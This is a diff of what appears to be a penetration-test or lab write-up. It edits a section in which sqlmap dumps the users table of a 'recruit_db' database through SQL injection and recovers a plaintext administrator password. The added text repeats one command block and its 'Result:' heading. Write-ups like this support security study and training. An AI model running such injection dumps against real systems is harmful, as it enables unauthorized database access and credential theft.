@@ -396,11 +396,29 @@ sqlmap -r req -D recruit_db -T users --dump
 Result:
 
 ```text
-+----+----------------+----------+
-| id | password       | username |
-+----+----------------+----------+
-| 1  | admin@001admin | admin    |
-+----+----------------+----------+
++----------+
+| username |
++----------+
+| admin    |
++----------+
+
+```
+```bash
+sqlmap -r req -D recruit_db -T users -C password --dump
+```
+Result:
+
+```bash
+sqlmap -r req -D recruit_db -T users -C password --dump
+```
+
+Result:
+```bash
++----------------+
+| password       |
++----------------+
+| admin@001admin |
++----------------+
 ```
 
 Administrator credentials recovered:
